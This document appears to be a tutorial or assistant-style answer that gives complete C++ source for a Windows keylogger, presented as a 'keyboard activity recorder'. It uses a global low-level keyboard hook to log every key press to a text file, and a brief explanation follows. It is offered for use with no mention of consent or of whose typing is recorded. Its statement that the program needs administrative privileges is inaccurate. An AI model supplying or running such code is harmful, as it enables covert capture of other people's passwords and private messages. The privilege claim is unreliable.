**Keyboard Activity Recorder in C++**
=====================================

This program uses the Windows API to record all keyboard activity and save it to a file. Please note that this program requires administrative privileges to run.

**Code**
```cpp
#include <Windows.h>
#include <fstream>
#include <iostream>

// Global variables
HHOOK hHook;
std::ofstream logFile;

// Function to handle keyboard events
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;

        // Check if the event is a key press
        if (wParam == WM_KEYDOWN)
        {
            // Get the virtual key code
            int vkCode = kbdStruct->vkCode;

            // Convert the virtual key code to a character
            char keyChar = MapVirtualKey(vkCode, MAPVK_VK_TO_CHAR);

            // Log the key press
            logFile << keyChar;
        }
    }

    // Call the next hook in the chain
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main()
{
    // Open the log file
    logFile.open("keyboard_log.txt");

    if (!logFile.is_open())
    {
        std::cerr << "Failed to open log file." << std::endl;
        return 1;
    }

    // Set up the keyboard hook
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);

    if (hHook == NULL)
    {
        std::cerr << "Failed to set up keyboard hook." << std::endl;
        return 1;
    }

    // Run the message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook the keyboard hook
    UnhookWindowsHookEx(hHook);

    // Close the log file
    logFile.close();

    return 0;
}
```

**Explanation**
---------------

This program uses the Windows API to set up a low-level keyboard hook. The `KeyboardHook` function is called for every keyboard event, and it logs the key presses to a file.

The `main` function sets up the keyboard hook and runs the message loop. The message loop is necessary to keep the program running and to allow the keyboard hook to receive events.

